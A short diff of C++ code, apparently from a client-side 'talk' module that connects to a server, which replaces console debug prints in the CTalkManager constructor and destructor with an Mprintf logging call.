@@ -33,12 +33,12 @@ CTalkManager::CTalkManager(IOCPClient* ClientObject, int n):CManager(ClientObjec
 	m_ClientObject->OnServerSending((char*)&bToken, 1);
 	g_IOCPClientObject = ClientObject;
 	WaitForDialogOpen();
-	cout << "Talk 构造\n";
+	Mprintf("Talk 构造\n");
 }
 
 CTalkManager::~CTalkManager()
 {
-	cout<<"Talk 析构\n";
+	Mprintf("Talk 析构\n");
 }
 
 VOID CTalkManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
